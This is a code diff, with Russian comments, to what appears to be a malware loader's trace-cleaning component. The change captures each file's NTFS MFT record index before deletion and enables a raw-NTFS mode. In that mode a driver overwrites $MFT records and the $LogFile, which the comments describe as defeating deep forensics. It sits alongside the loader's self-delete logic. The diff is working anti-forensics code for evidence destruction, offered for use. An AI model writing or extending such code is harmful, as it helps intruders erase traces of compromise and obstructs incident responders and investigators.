@@ -70,6 +70,22 @@ static void GetCurrentUserSidW(wchar_t* out, size_t cap) {
     CloseHandle(tok);
 }
 
+// MFT record index файла через FSCTL_READ_FILE_USN_DATA (до удаления).
+static unsigned long long GetMftIndex(const std::wstring& path) {
+    HANDLE h = CreateFileW(path.c_str(), GENERIC_READ,
+                           FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+                           nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (h == INVALID_HANDLE_VALUE) return 0;
+    USN_RECORD r{};
+    DWORD bytes = 0;
+    unsigned long long idx = 0;
+    if (DeviceIoControl(h, FSCTL_READ_FILE_USN_DATA, nullptr, 0,
+                        &r, sizeof(r), &bytes, nullptr))
+        idx = r.FileReferenceNumber & 0x0000FFFFFFFFFFFFULL;
+    CloseHandle(h);
+    return idx;
+}
+
 static void AddFileToRequest(CleanRequest& req, const std::wstring& path) {
     if (req.file_count >= SC_MAX_FILES) return;
     // Не добавляем запущенный образ — его сносит юзермод self-delete.
@@ -77,6 +93,8 @@ static void AddFileToRequest(CleanRequest& req, const std::wstring& path) {
         _wcsicmp(path.c_str(), req.loader_path) == 0)
         return;
     wcsncpy_s(req.file_paths[req.file_count], SC_PATH_LEN, path.c_str(), _TRUNCATE);
+    // Захватываем MFT-индекс ДО удаления — драйвер затирает запись в $MFT.
+    req.mft_indices[req.file_count] = GetMftIndex(path);
     ++req.file_count;
 }
 
@@ -97,7 +115,8 @@ static void EnumerateIntoRequest(CleanRequest& req, const std::wstring& dir,
 static void FillCleanRequest(CleanRequest& req) {
     req = {};
     req.magic = SHADOW_CLEAN_MAGIC;
-    req.flags = SC_DO_ALL;
+    // SC_DO_ALL + raw NTFS ($LogFile + MFT-записи) — deep-forensics закрытие.
+    req.flags = SC_DO_ALL | SC_DO_RAWNTFS;
     req.loader_pid = GetCurrentProcessId();
 
     GetCurrentUserSidW(req.user_sid, RTL_NUMBER_OF(req.user_sid));
